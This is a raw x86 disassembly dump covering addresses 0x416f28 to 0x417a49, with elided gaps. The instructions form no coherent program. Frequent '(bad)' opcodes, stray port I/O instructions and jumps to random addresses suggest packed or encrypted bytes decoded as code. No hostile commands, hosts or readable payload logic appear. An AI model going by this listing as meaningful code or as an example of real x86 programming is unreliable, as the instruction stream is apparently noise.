  416f28:	or     BYTE PTR [eax-0x15],dh
  416f2b:	pop    edx
  416f2c:	ret    
  416f2d:	inc    eax
  416f2e:	out    0x3,eax
  416f30:	inc    ebp
  416f31:	sbb    edx,DWORD PTR [ecx+ecx*1-0x19]
  416f35:	mov    al,0xe9
  416f37:	add    edi,DWORD PTR [esi]
  416f39:	jae    0x416fa0
  416f3b:	int3   
	...
  416f64:	add    BYTE PTR [eax],al
  416f66:	jle    0x416fc3
  416f68:	(bad)  
  416f69:	mov    ecx,0xf5eef345
  416f6e:	shl    ch,1
  416f70:	bound  edx,QWORD PTR [edx+edi*4-0x21]
  416f74:	mov    bl,0x3b
  416f76:	shl    ch,0x37
  416f79:	(bad)  
  416f7a:	mov    eax,ds:0xb042d98e
  416f7f:	shr    DWORD PTR [esp+esi*1-0x50],cl
  416f83:	in     eax,0x8e
  416f85:	scas   al,BYTE PTR es:[edi]
  416f86:	mov    eax,ds:0xfeb0cc7d
  416f8b:	pop    edx
  416f8c:	jle    0x417007
  416f8e:	mov    eax,ds:0xfd7600ed
  416f93:	in     al,0x73
  416f95:	loope  0x416fec
  416f97:	mov    BYTE PTR [edi],ch
  416f99:	data16 std 
  416f9b:	rol    BYTE PTR [ebx-0x21acab3],cl
  416fa1:	ret    
  416fa2:	cmp    eax,0x7abc3273
  416fa7:	in     eax,0xfe
  416fa9:	jl     0x416fbd
  416fab:	in     eax,dx
  416fac:	std    
  416fad:	ds std 
  416faf:	outs   dx,BYTE PTR ds:[esi]
  416fb0:	or     BYTE PTR [ecx-0x7f],al
  416fb3:	sub    bh,ch
  416fb5:	cs mov bl,0xde
  416fb8:	call   0x6b26ecdb
  416fbd:	jmp    0xa8ac97a7
  416fc2:	cmp    eax,0x6519b3e4
  416fc7:	in     eax,0xfd
  416fc9:	push   es
	...
  416ff2:	add    BYTE PTR [eax],al
  416ff4:	xlat   BYTE PTR ds:[ebx]
  416ff5:	pop    esp
  416ff6:	call   0xfe277acc
  416ffb:	pusha  
  416ffc:	mov    bh,0xf8
  416ffe:	cmc    
  416fff:	out    dx,al
  417000:	jl     0x416fd9
  417002:	add    ebp,0x34
  417005:	in     eax,0xfd
  417007:	cmp    DWORD PTR [edx+0x42286b9d],esp
  41700d:	in     al,0xb3
  41700f:	fldenv [eiz*8+0x5c96c6fd]
  417016:	call   0xfe273b0c
  41701b:	pusha  
  41701c:	mov    dh,0x4
  41701e:	imul   BYTE PTR [esi+0x1100727c]
  417024:	lea    esi,[edi+0x3f]
  417027:	jmp    0x9f321f28
  41702c:	cld    
  41702d:	in     al,0xfd
  41702f:	adc    al,0x32
  417031:	repz jmp 0x417034
  417034:	xlat   BYTE PTR ds:[ebx]
  417035:	cdq    
  417036:	dec    BYTE PTR [ecx-0x97fe6]
  41703c:	adc    bl,cl
  41703e:	test   al,dl
  417040:	or     BYTE PTR [ecx+0x68f50fe],bl
  417046:	ins    DWORD PTR es:[edi],dx
  417047:	inc    ecx
  417048:	addr16 cdq 
  41704a:	mov    ah,0xf0
  41704c:	or     BYTE PTR [ecx+0x508afffe],bl
  417052:	call   0xfedac824
  417057:	mov    DWORD PTR [eax],eax
	...
  417081:	add    dl,bl
  417083:	mov    esi,esi
  417085:	call   DWORD PTR [eax]
  417087:	mov    dh,0xfd
  417089:	addr16 jns 0x417037
  41708c:	inc    eax
  41708d:	add    BYTE PTR [eax+0x63],ah
  417090:	in     eax,dx
  417091:	not    DWORD PTR [eax-0x67]
  417094:	(bad)  
  417095:	jne    0x4170b6
  417097:	xor    BYTE PTR [edi-0x7766cfd0],ch
  41709d:	test   DWORD PTR [ebx+0x21],edx
  4170a0:	(bad)  
  4170a1:	jmp    DWORD PTR [edx+0x10f7c1d3]
  4170a7:	call   0x40:0xab86684d
  4170ae:	loopne 0x41711b
  4170b0:	in     eax,dx
  4170b1:	not    DWORD PTR [eax]
  4170b3:	call   0x308f:0x2fdf75fe
  4170ba:	lock cdq 
  4170bc:	mov    BYTE PTR [ebp-0x1de71],al
  4170c2:	ins    DWORD PTR es:[edi],dx
  4170c3:	pop    edi
  4170c4:	push   0xfe18827a
  4170c9:	dec    BYTE PTR [edx+0x2f]
  4170cc:	idiv   bh
  4170ce:	loopne 0x417069
  4170d0:	je     0x4170da
  4170d2:	iret   
  4170d3:	mov    eax,ds:0xcd3eff2d
  4170d8:	mov    DWORD PTR [esi+edi*2-0x3401c034],eax
  4170df:	jbe    0x41715d
  4170e1:	not    BYTE PTR [ecx+0x67d464]
	...
  41710f:	add    al,al
  417111:	pop    esi
  417112:	sar    edi,0x80
  417115:	cs xor al,0xf6
  417118:	jns    0x417196
  41711a:	aas    
  41711b:	je     0x417163
  41711d:	mov    dl,bh
  41711f:	das    
  417120:	imul   ecx,DWORD PTR [ecx+ecx*4+0x3f8ca284],0x30debdfe
  41712b:	not    BYTE PTR [ecx+0x24]
  41712e:	add    al,0xf
  417130:	ret    0x434
  417133:	add    BYTE PTR [esi],bh
  417135:	jno    0x4171b4
  417137:	iret   
  417138:	xor    DWORD PTR [edx],edi
  41713a:	aas    
  41713b:	jmp    FWORD PTR [edx-0x19437b11]
  417141:	inc    ecx
  417142:	aas    
  417143:	(bad)  
  417144:	add    DWORD PTR ds:[esi+0x1f43eb0],eax
  41714b:	push   0xbd30f43e
  417150:	or     DWORD PTR [eax+0x11],esp
  417153:	call   0xfe828d1c
  417158:	stc    
  417159:	mov    edi,0x1f1f62d
  41715e:	inc    ecx
  41715f:	je     0x4171af
  417161:	sbb    al,0x10
  417163:	sub    ah,cl
  417165:	adc    DWORD PTR [ecx-0x4c],eax
  417168:	out    0xa1,al
  41716a:	inc    eax
  41716b:	(bad)  
  41716c:	shl    DWORD PTR [edi],1
  41716e:	adc    al,0xe8
  417170:	ds pop esi
  417172:	aas    
  417173:	inc    BYTE PTR [eax]
	...
  41719d:	add    cl,al
  41719f:	addr16 and eax,0xa65bb9f6
  4171a5:	inc    eax
  4171a6:	sub    cl,BYTE PTR [ebx-0x71]
  4171a9:	xor    eax,0x4096e256
  4171ae:	jmp    0x3ce2:0x984096ff
  4171b5:	and    ecx,DWORD PTR [eax+0x12407ee2]
  4171bb:	dec    ebx
  4171bc:	jg     0x417233
  4171be:	push   esi
  4171bf:	loop   0x41722f
  4171c1:	inc    eax
  4171c2:	mov    dl,0x3
  4171c4:	pop    edi
  4171c5:	inc    eax
  4171c6:	jo     0x4171aa
  4171c8:	aam    0x13
  4171ca:	push   esi
  4171cb:	or     eax,DWORD PTR [ecx]
  4171cd:	inc    ecx
  4171ce:	pusha  
  4171cf:	loop   0x417165
  4171d1:	push   ebx
  4171d2:	push   eax
  4171d3:	loop   0x41721b
  4171d5:	inc    eax
  4171d6:	mov    al,BYTE PTR [edi]
  4171d8:	aaa    
  4171d9:	inc    eax
  4171da:	dec    eax
  4171db:	loop   0x417199
  4171dd:	adc    edx,DWORD PTR [esi-0x35]
  4171e0:	add    BYTE PTR [ecx+0x38],al
  4171e3:	loop   0x417241
  4171e5:	dec    edi
  4171e6:	sub    dl,ah
  4171e8:	push   ds
  4171e9:	inc    eax
  4171ea:	mov    dl,0x4b
  4171ec:	push   DWORD PTR [eax+0x56]
  4171ef:	loop   0x4171ff
  4171f1:	inc    eax
  4171f2:	rcl    BYTE PTR [esi],cl
  4171f4:	(bad)  
  4171f5:	aas    
  4171f6:	adc    dl,ah
  4171f8:	xor    al,0x4b
  4171fa:	adc    dl,ah
  4171fc:	idiv   BYTE PTR [edi]
  4171fe:	mov    cl,BYTE PTR [ebx-0x1]
  417201:	mov    al,0x0
	...
  41722b:	add    BYTE PTR [esi],ah
  41722d:	loop   0x417215
  41722f:	aas    
  417230:	stos   BYTE PTR es:[edi],al
  417231:	sbb    dl,bh
  417233:	aas    
  417234:	call   0xd655cf1a
  417239:	into   
  41723a:	add    BYTE PTR [edi],bh
  41723c:	fsub   st,st(1)
  41723e:	jl     0x4172bc
  417240:	enter  0xbee1,0x3f
  417244:	xchg   edx,eax
  417245:	sahf   
  417246:	add    BYTE PTR [esi+0x34fde101],bh
  41724c:	push   edx
  41724d:	repz dec esp
  41724f:	shl    BYTE PTR [eax-0x1f],1
  417252:	std    
  417253:	adc    al,0x52
  417255:	loop   0x41720a
  417257:	cdq    
  417258:	imul   esp,ecx,0x59d78efd
  41725e:	call   0xfe2271ce
  417263:	jle    0x41726c
  417265:	repnz cmc 
  417267:	jbe    0x4172aa
  417269:	cli    
  41726a:	inc    edi
  41726b:	mov    ebp,0x9cfde138
  417270:	cs jmp 0x205bd173
  417276:	sub    al,0x56
  417278:	and    ecx,esp
  41727a:	mov    bl,0x41
  41727c:	adc    ecx,esp
  41727e:	std    
  41727f:	push   ecx
  417280:	dec    ebp
  417281:	xor    eax,0xa7093efd
  417286:	in     al,0x3e
  417288:	add    ecx,esp
  41728a:	call   0xfe23a090
  41728f:	add    BYTE PTR es:[eax],al
	...
  4172ba:	mov    bh,0x0
  4172bc:	neg    BYTE PTR [esi]
  4172be:	imul   edi,eax,0xe160c51b
  4172c4:	std    
  4172c5:	push   esp
  4172c6:	jp     0x4172b1
  4172c8:	std    
  4172c9:	push   es
  4172ca:	bound  ecx,QWORD PTR [edx+0x2c]
  4172cd:	dec    BYTE PTR [eax-0x1f]
  4172d0:	mov    bl,0x1d
  4172d2:	dec    ecx
  4172d3:	loope  0x4172d2
  4172d5:	add    DWORD PTR [ecx+0x2f],eax
  4172d8:	std    
  4172d9:	out    0x30,al
  4172db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172dc:	int3   
  4172dd:	(bad)  
  4172de:	sub    cl,ah
  4172e0:	call   0xfe2347ba
  4172e5:	into   
  4172e6:	push   esi
  4172e7:	sbb    dh,dh
  4172e9:	add    al,bh
  4172eb:	and    ebp,esp
  4172ed:	icebp  
  4172ee:	sub    al,0x20
  4172f0:	(bad)  
  4172f1:	inc    DWORD PTR [edx-0x64]
  4172f4:	idiv   bh
  4172f6:	call   0xd86d562f
  4172fb:	and    esi,edi
  4172fd:	mov    ch,0xb
  4172ff:	sub    esi,edi
  417301:	(bad)  
  417302:	mov    edi,0xc8ff2a85
  417307:	and    DWORD PTR [eax+edi*8-0x52],eax
  41730b:	hlt    
  41730c:	cld    
  41730d:	dec    DWORD PTR [eax]
  41730f:	and    DWORD PTR [esp+edi*8-0x41],esi
  417313:	sub    DWORD PTR [esi],edx
  417315:	add    BYTE PTR [edi-0x71],ah
  417318:	mov    edi,0x8b03670c
  41731d:	in     al,dx
	...
  417346:	add    BYTE PTR [eax],al
  417348:	aam    0x97
  41734a:	stc    
  41734b:	push   0x57
  41734d:	mov    dl,0x59
  41734f:	push   DWORD PTR [edx+0x54]
  417352:	call   0xfe61a344
  417357:	mov    DWORD PTR [edx+0x5f75fe20],esp
  41735d:	mov    ah,0xd
  41735f:	ins    DWORD PTR es:[edi],dx
  417360:	out    0x5b,al
  417362:	std    
  417363:	xor    eax,0x41148d
  417368:	dec    edi
  417369:	mov    edi,ecx
  41736b:	dec    DWORD PTR [eax+0x21]
  41736e:	je     0x417378
  417370:	mov    edi,0x27416b4b
  417375:	mov    ah,0xff
  417377:	call   DWORD PTR [edi]
  417379:	fsubr  st(5),st
  41737b:	mov    ebx,0xfffe1e0b
  417380:	jb     0x4173a2
  417382:	(bad)  
  417383:	jne    0x417374
  417385:	xor    edi,ebp
  417387:	sub    BYTE PTR [eax],cl
  417389:	push   ds
  41738a:	enter  0x3ec2,0xee
  41738e:	add    DWORD PTR [ebp-0x3b],edx
  417391:	popf   
  417392:	jg     0x417357
  417394:	ror    BYTE PTR [ecx+0x5fd90004],cl
  41739a:	lods   al,BYTE PTR ds:[esi]
  41739b:	xchg   edx,eax
  41739c:	push   ebx
  41739d:	xor    eax,DWORD PTR [edi+edi*8]
  4173a0:	xor    edi,esi
  4173a2:	cmp    al,0x74
  4173a4:	inc    esi
  4173a5:	retf   0x53d5
  4173a8:	test   eax,0xacc0
	...
  4173d5:	add    BYTE PTR [esi],bh
  4173d7:	fnstcw WORD PTR [esi+0x67]
  4173da:	mov    ecx,0x90ffc2de
  4173df:	fimul  WORD PTR ds:0x29ea13ff
  4173e5:	aas    
  4173e6:	jmp    0x29fd:0xf3fe3b68
  4173ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173ee:	cs jns 0x41742c
  4173f1:	or     bh,BYTE PTR [esi+0x5]
  4173f4:	test   DWORD PTR [eax-0x537a05],0x677e2059
  4173fe:	lods   eax,DWORD PTR ds:[esi]
  4173ff:	push   es
  417400:	ret    
  417401:	dec    DWORD PTR [eax-0x5a]
  417404:	cmp    eax,0x29f9cbfe
  417409:	sbb    edx,DWORD PTR [edx+0x3f673b2d]
  41740f:	hlt    
  417410:	sub    al,0xbd
  417412:	xchg   esi,eax
  417413:	pop    ebp
  417414:	lods   eax,DWORD PTR ds:[esi]
  417415:	inc    eax
  417416:	ds inc ebp
  417418:	mov    ch,0xfb
  41741a:	sbb    eax,ecx
  41741c:	or     eax,ebp
  41741e:	cmp    eax,eax
  417420:	cmp    al,0xfe
  417422:	or     DWORD PTR [eax+0x3d],ebp
  417425:	out    0x33,eax
  417427:	sbb    DWORD PTR ds:0xc3307fe,edi
  41742d:	add    BYTE PTR [ebx-0x43d08da5],cl
  417433:	pop    ss
  417434:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417435:	test   eax,0xaedd76e1
	...
  417462:	add    BYTE PTR [eax],al
  417464:	jle    0x4174c1
  417466:	aas    
  417467:	jle    0x4174cb
  417469:	pushf  
  41746a:	out    0x3c,eax
  41746c:	push   edx
  41746d:	dec    edi
  41746e:	iret   
  41746f:	add    al,0x10
  417471:	fidiv  WORD PTR [esi-0x2a9881f8]
  417477:	mov    bh,dl
  417479:	fisub  WORD PTR [esi+0x14dea5b6]
  41747f:	or     al,0x96
  417481:	jle    0x417419
  417483:	cmp    al,0x98
  417485:	ficom  WORD PTR [eax+eax*2]
  417488:	cdq    
  417489:	or     dl,dl
  41748b:	cmp    al,0x88
  41748d:	jno    0x417476
  41748f:	stos   DWORD PTR es:[edi],eax
  417490:	cmp    DWORD PTR [ebp+0x28],ebp
  417493:	add    al,0xe6
  417495:	pushf  
  417496:	cld    
  417497:	ret    0xdd71
  41749a:	fmul   QWORD PTR [edi]
  41749c:	push   esi
  41749d:	add    al,0xd
  41749f:	cmp    eax,0xb7275260
  4174a4:	xor    edx,esp
  4174a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174a7:	aas    
  4174a8:	push   eax
  4174a9:	push   0x52d23c43
  4174ae:	dec    edi
  4174af:	repnz inc eax
  4174b1:	fidiv  WORD PTR [esi]
  4174b3:	cmp    al,0xb2
  4174b5:	fistp  QWORD PTR [edi]
  4174b7:	fisub  WORD PTR fs:0x29a9
  4174bd:	jbe    0x4174bf
  4174bf:	scas   al,BYTE PTR es:[edi]
  4174c0:	jle    0x41751d
  4174c2:	jg     0x41751b
  4174c4:	stos   BYTE PTR es:[edi],al
  4174c5:	pushf  
  4174c6:	out    0x3c,eax
	...
  4174f0:	add    BYTE PTR [eax],al
  4174f2:	mov    cl,BYTE PTR [edi+0xf]
  4174f5:	push   0x7fede5a
  4174fa:	(bad)  
  4174fb:	data16 add bh,bl
  4174fe:	les    edx,FWORD PTR [esi-0x1e541104]
  417504:	std    
  417505:	pop    esp
  417506:	cmp    dh,bl
  417508:	add    esi,ebx
  41750a:	and    eax,0x165cfddd
  41750f:	div    BYTE PTR [edi+0x3]
  417512:	adc    eax,0xe2c8bdd
  417517:	mov    gs,WORD PTR [eax-0x26]
  41751a:	xchg   edi,eax
  41751b:	call   0xe93f:0x6f0e4100
  417522:	je     0x41758b
  417524:	or     al,0x91
  417526:	jmp    0x31e07259
  41752b:	sbb    esi,DWORD PTR [ebp+0x10]
  41752e:	retf   
  41752f:	xchg   esi,eax
  417530:	clc    
  417531:	push   0xffffffd7
  417533:	jmp    0xd117713c
  417538:	inc    ebx
  417539:	xor    DWORD PTR [ecx+0x5cd93cdd],0x3ef7fddd
  417543:	mov    ds:0x5b420e10,eax
  417548:	xchg   DWORD PTR [ebp+ebp*1-0x70a9b30f],esp
  41754f:	in     eax,dx
  417550:	push   0x9aa408
  417555:	je     0x417557
	...
  41757f:	add    BYTE PTR [edi+0x15],bh
  417582:	push   ecx
  417583:	push   ecx
  417584:	jae    0x4175cd
  417586:	add    cl,ch
  417588:	rcr    BYTE PTR [eax],0xd
  41758b:	pop    esp
  41758c:	call   FWORD PTR [eax]
  41758e:	push   ecx
  41758f:	je     0x417590
  417591:	adc    al,0x51
  417593:	xchg   ecx,eax
  417594:	jno    0x417605
  417596:	aas    
  417597:	jmp    0x14ddcf0
  41759c:	and    eax,0x4000fd30
  4175a1:	dec    esp
  4175a2:	shl    BYTE PTR [ebx+eiz*8-0x31],0x44
  4175a7:	cld    
  4175a8:	mov    fs:0x4d6903c1,al
  4175ae:	std    
  4175af:	jne    0x417594
  4175b1:	and    DWORD PTR [eax+ecx*1+0xf],esi
  4175b5:	fdivr  st,st(3)
  4175b7:	push   eax
  4175b9:	and    DWORD PTR [esp+edi*8-0x1],esi
  4175bd:	sub    DWORD PTR [eax],ebp
  4175bf:	inc    DWORD PTR [eax]
  4175c1:	and    cl,BYTE PTR [eax+esi*8+0x54]
  4175c5:	mov    ds:0x717a00ed,eax
  4175ca:	(bad)  
  4175cb:	jne    0x4175bc
  4175cd:	xor    bl,ah
  4175cf:	sub    eax,esp
  4175d1:	and    eax,ecx
  4175d3:	ret    0x58af
  4175d6:	push   ebx
  4175d7:	mov    eax,ebx
  4175d9:	aad    0xc1
  4175db:	cld    
  4175dc:	cmp    eax,0xc05d6a57
  4175e1:	stos   DWORD PTR es:[edi],eax
  4175e2:	add    eax,0xe8
	...
  41760b:	add    BYTE PTR [eax],al
  41760d:	add    BYTE PTR [edi-0x21000107],cl
  417613:	sbb    bh,dl
  417615:	push   0xbeed5867
  41761a:	pop    ebp
  41761c:	ins    BYTE PTR es:[edi],dx
  41761d:	inc    ecx
  41761e:	push   edi
  41761f:	mov    al,0xaa
  417621:	ins    DWORD PTR es:[edi],dx
  417622:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417623:	pop    eax
  417624:	std    
  417625:	jne    0x417686
  417627:	xor    dl,dh
  417629:	push   edx
  41762a:	add    BYTE PTR [ecx],ah
  41762c:	add    DWORD PTR gs:[edi+0x31],edx
  417630:	mov    ebx,0x40b39068
  417635:	add    bh,bh
  417637:	ins    BYTE PTR es:[edi],dx
  417638:	ins    BYTE PTR es:[edi],dx
  417639:	inc    ecx
  41763a:	pop    ss
  41763b:	and    DWORD PTR [eax+ecx*1+0x4f],esi
  41763f:	test   BYTE PTR [edi-0x1],cl
  417642:	ds inc ebp
  417644:	test   eax,0x78dd11ff
  417649:	lods   eax,DWORD PTR ds:[si]
  41764b:	mov    ah,0xff
  41764e:	cdq    
  41764f:	es test al,0x40
  417652:	ds in  eax,0xad
  417655:	pop    es
  417656:	out    0x36,al
  417658:	sar    esi,cl
  41765a:	jmp    0xd14177e8
  41765f:	mov    ebx,0x336b9eac
  417664:	add    al,0x68
  417666:	mov    bl,BYTE PTR [esi]
  417668:	sar    edi,0xc8
  41766b:	push   ds
  41766c:	or     al,0xe8
  41766e:	nop
  41766f:	aas    
  417670:	aaa    
  417671:	inc    BYTE PTR [eax]
	...
  41769b:	add    BYTE PTR [ecx-0xb89422],bh
  4176a1:	icebp  
  4176a2:	cmp    BYTE PTR [esi+esi*1-0x36],dh
  4176a6:	fdivp  st(5),st
  4176a8:	mov    eax,ds:0x3e01acbc
  4176ad:	repnz cmp esi,0x4c29fa0b
  4176b4:	mov    ah,dl
  4176b6:	aaa    
  4176b7:	dec    BYTE PTR [ebx]
  4176b9:	pop    esi
  4176ba:	aaa    
  4176bb:	je     0x417703
  4176bd:	fimul  DWORD PTR [ecx+0x25]
  4176c0:	jno    0x41772e
  4176c2:	dec    ecx
  4176c3:	rol    DWORD PTR [edx-0xe],0xce
  4176c7:	mov    dl,BYTE PTR [edx+0x70]
  4176ca:	inc    eax
  4176cb:	sti    
  4176cc:	pop    ecx
  4176cd:	dec    BYTE PTR ds:0x29e1cbff
  4176d3:	xchg   edi,eax
  4176d4:	pop    es
  4176d5:	xchg   ebp,eax
  4176d6:	aaa    
  4176d7:	or     bh,BYTE PTR [esi-0x5b]
  4176da:	repnz mov BYTE PTR [ebx+0x56743790],al
  4176e1:	mov    DWORD PTR [ebp+0x3c5c1607],ebp
  4176e7:	fbld   TBYTE PTR [eax]
  4176e9:	fistp  DWORD PTR [esi]
  4176eb:	scas   eax,DWORD PTR es:[edi]
  4176ec:	inc    ebp
  4176ed:	ficomp DWORD PTR [ebx+ecx*1+0x38c58826]
  4176f4:	or     bl,bl
  4176f6:	jl     0x41772f
  4176f8:	add    BYTE PTR [ecx-0x11],dl
  4176fb:	sub    ebx,DWORD PTR [esi]
  4176fd:	xor    esi,0x38
	...
  417727:	add    BYTE PTR [eax],al
  417729:	add    al,dh
  41772b:	push   eax
  41772c:	jmp    0x417759
  41772e:	inc    ebx
  41772f:	test   dh,ah
  417731:	cmp    BYTE PTR [ecx+0x3e03e75c],ch
  417737:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417738:	test   eax,0x62303e0f
  41773d:	daa    
  41773e:	mov    esp,0x6bd0bf9f
  417743:	adc    bl,BYTE PTR cs:[ebp-0x8]
  417747:	test   BYTE PTR [ebp-0x3d],al
  41774a:	mov    cl,0xe7
  41774c:	and    al,0x38
  41774e:	stc    
  41774f:	xor    DWORD PTR [esi+0x14da31ae],esp
  417755:	or     BYTE PTR [esi-0x6fc73d30],ah
  41775b:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41775d:	scas   eax,DWORD PTR es:[edi]
  41775e:	daa    
  41775f:	sub    ecx,DWORD PTR [edi]
  417761:	add    al,0x3e
  417763:	retf   0x383d
  417766:	repnz (bad) 
  417768:	pop    ss
  417769:	shl    DWORD PTR [eax+0x50],1
  41776c:	fild   QWORD PTR [ebx]
  41776e:	call   0x3479de4c
  417773:	mov    bl,0x4f
  417775:	js     0x417798
  417777:	ficom  DWORD PTR [esi+0x37]
  41777a:	or     al,0x9b
  41777c:	nop
  41777d:	cmp    BYTE PTR [eax-0x26],cl
  417780:	inc    esi
  417781:	xor    eax,0xaee69393
  417786:	std    
  417787:	sbb    DWORD PTR [ecx],eax
  417789:	cmc    
  41778a:	out    0x1a,al
  41778c:	add    BYTE PTR [eax+eax*1+0x0],bl
	...
  4177b8:	call   0x66ffc892
  4177bd:	dec    edi
  4177be:	adc    BYTE PTR [esi],bl
  4177c0:	call   0x229f602a
  4177c5:	fscale 
  4177c7:	loop   0x417846
  4177c9:	dec    esi
  4177ca:	xor    BYTE PTR [ecx-0x6e07e14c],bl
  4177d0:	inc    edx
  4177d1:	pop    ebx
  4177d2:	in     eax,dx
  4177d3:	aaa    
  4177d4:	ss dec edi
  4177d6:	or     BYTE PTR [ecx],al
  4177d8:	in     eax,0x7e
  4177da:	std    
  4177db:	out    0xf1,al
  4177dd:	fdiv   DWORD PTR [ebx-0xf]
  4177e0:	and    eax,0x9d623eb
  4177e5:	fnstenv [ebx-0x33]
  4177e8:	adc    DWORD PTR [edi-0x8],ecx
  4177eb:	(bad)  
  4177ec:	(bad)  
  4177ed:	popa   
  4177ee:	call   0xfe1a1709
  4177f3:	shl    ebp,0x81
  4177f6:	std    
  4177f7:	scas   al,BYTE PTR es:[edi]
  4177f8:	mov    ebp,0xada4ffa4
  4177fd:	sbb    DWORD PTR [eax-0x226ae62],edi
  417803:	fwait
  417804:	sbb    BYTE PTR [edx+0x19201405],dl
  41780a:	lea    edx,[esi]
  41780c:	jnp    0x4177e7
  41780e:	mov    WORD PTR [esi+esi*1],fs
  417811:	sub    dl,BYTE PTR [ebp+0x76]
  417814:	scas   eax,DWORD PTR es:[edi]
  417815:	imul   edi,ebp,0x5bc341f4
  41781b:	adc    al,BYTE PTR [eax]
	...
  417845:	add    BYTE PTR [ecx],ch
  417847:	(bad)  [ecx]
  417849:	sub    DWORD PTR [esi+0xa625033],ecx
  41784f:	fnstsw WORD PTR [ebx+0x4d]
  417852:	inc    ebx
  417853:	push   ecx
  417854:	dec    esp
  417855:	add    bh,dl
  417857:	rol    BYTE PTR [eax],1
  417859:	jne    0x417878
  41785b:	pop    ss
  41785c:	dec    DWORD PTR [ebp+0x6b]
  41785f:	pop    es
  417860:	add    DWORD PTR [eax],eax
  417862:	push   0x5b75fe51
  417867:	test   eax,0x64b2ff56
  41786c:	call   0xfed1a247
  417871:	or     ecx,DWORD PTR [edi-0x7c]
  417874:	sub    al,0x80
  417876:	stc    
  417877:	pop    edx
  417878:	jae    0x4178a2
  41787a:	mov    eax,ds:0xbdfc4c91
  41787f:	pop    esp
  417880:	mov    eax,DWORD PTR [ebp-0x25]
  417883:	lods   al,BYTE PTR ds:[esi]
  417884:	push   ebx
  417885:	call   0x4027e0
  41788a:	int3   
  41788b:	sbb    al,0x71
  41788d:	adc    al,0x7f
  41788f:	pop    ebp
  417890:	add    bh,ch
  417892:	mov    ecx,0x21fc7491
  417897:	test   al,0xfe
  417899:	jne    0x41784a
  41789b:	test   BYTE PTR [esi+0xa91e8fe],ah
  4178a1:	fdivr  DWORD PTR [edi+0x79]
  4178a4:	es (bad) 
  4178a6:	fcom   DWORD PTR [eax+0xc032]
	...
  4178d4:	push   ds
  4178d5:	xchg   ecx,eax
  4178d6:	(bad)  
  4178d7:	jmp    FWORD PTR [eax-0x5fc75476]
  4178dd:	or     eax,DWORD PTR [edx+0x41019abf]
  4178e3:	add    dl,ch
  4178e5:	call   0x1074:0x905050f9
  4178ec:	fmul   DWORD PTR [edx]
  4178ee:	or     ch,al
  4178f0:	sti    
  4178f1:	sar    esi,0xff
  4178f4:	dec    esp
  4178f5:	sbb    al,0x71
  4178f7:	xor    BYTE PTR [esi],bh
  4178f9:	adc    cl,BYTE PTR [ebp-0x265b9bc]
  4178ff:	call   DWORD PTR [eax-0x20]
  417902:	ss je  0x41794b
  417905:	sub    ah,BYTE PTR [ecx-0x316ecedd]
  41790b:	(bad)  
  41790c:	mov    bl,0xba
  41790e:	sub    DWORD PTR [eax-0x1c97ea6],edi
  417914:	xchg   ebx,eax
  417915:	jbe    0x41794d
  417917:	je     0x41792f
  417919:	jno    0x4178cb
  41791b:	pop    es
  41791c:	push   ss
  41791d:	jmp    0x6a4377ff
  417922:	xchg   edx,eax
  417923:	es stc 
  417925:	fdivr  DWORD PTR [edi-0x36]
  417928:	aas    
  417929:	into   
  41792a:	out    dx,eax
  41792b:	mov    edi,0xfe33c8a7
  417930:	loope  0x4178e5
  417932:	data16 aaa 
  417934:	inc    ecx
  417935:	das    
  417936:	data16 or al,BYTE PTR [eax]
	...
  417961:	add    ch,dh
  417963:	xor    eax,0xc22e6805
  417968:	and    al,0xbd
  41796a:	rcl    DWORD PTR [esi+0x5e5ce80c],0x33
  417971:	inc    ch
  417973:	add    al,0xd8
  417975:	pop    ebp
  417976:	or     ebx,edi
  417978:	inc    edx
  417979:	(bad)  
  41797b:	xchg   edi,eax
  41797c:	xchg   ebx,ebp
  41797e:	mov    edi,0x91f634fd
  417983:	lock test DWORD PTR [edx+ecx*4-0x6f],eax
  417988:	xor    esi,DWORD PTR [esi+ebp*1-0x1f]
  41798c:	lods   eax,DWORD PTR ds:[esi]
  41798d:	or     esp,DWORD PTR [esi+0x43]
  417990:	(bad)  
  417992:	ds mov ebp,0xe97441
  417998:	mov    esi,0xe75b3ef7
  41799d:	add    edi,DWORD PTR [esi]
  41799f:	mov    al,ds:0x5f502fa4
  4179a4:	out    0x3,eax
  4179a6:	aam    0x5a
  4179a8:	rol    DWORD PTR [ebx],0xd4
  4179ab:	pop    edx
  4179ac:	rol    DWORD PTR [ebx],1
  4179ae:	retf   
  4179af:	and    BYTE PTR [ebx],dh
  4179b1:	aam    0xc2
  4179b3:	loopne 0x4179f0
  4179b5:	sub    eax,0x3497d728
  4179ba:	stos   BYTE PTR es:[edi],al
  4179bb:	shl    DWORD PTR [esi],cl
  4179bd:	scas   eax,DWORD PTR es:[edi]
  4179be:	adc    eax,0x3e10bfc4
  4179c3:	pop    ebx
  4179c4:	loop   0x417a09
	...
  4179ee:	add    BYTE PTR [eax],al
  4179f0:	lea    ebx,[ecx+0x2]
  4179f3:	mov    edi,0xc2afdd99
  4179f8:	stc    
  4179f9:	aad    0x74
  4179fb:	adc    esp,esi
  4179fd:	pop    es
  4179fe:	ret    0xe834
  417a01:	loop   0x417a1a
  417a03:	xchg   DWORD PTR [edx-0x27cb2131],edi
  417a09:	sub    edi,DWORD PTR [ecx]
  417a0b:	sub    al,0xce
  417a0d:	adc    esi,0xd7e0b634
  417a13:	sub    al,0xc0
  417a15:	(bad)  
  417a16:	push   ecx
  417a17:	add    al,0xb9
  417a19:	adc    BYTE PTR [eax-0x49294fd4],bh
  417a1f:	scas   al,BYTE PTR es:[edi]
  417a20:	xor    eax,0x960c34d6
  417a25:	ret    
  417a26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a27:	xor    al,0x98
  417a29:	(bad)  
  417a2a:	push   esp
  417a2b:	xor    ecx,DWORD PTR [eax+0x672b96d6]
  417a31:	jge    0x4179c1
  417a33:	xor    al,0x80
  417a35:	and    BYTE PTR [edi+0x28],bh
  417a38:	leave  
  417a39:	(bad)  
  417a3a:	hlt    
  417a3b:	aaa    
  417a3c:	pop    ecx
  417a3d:	aam    0x0
  417a3f:	fstp   TBYTE PTR ds:0x39abc75b
  417a45:	pop    ebx
  417a46:	push   ebx
  417a47:	jb     0x417a6a
  417a49:	fcmovnb st,st(4)
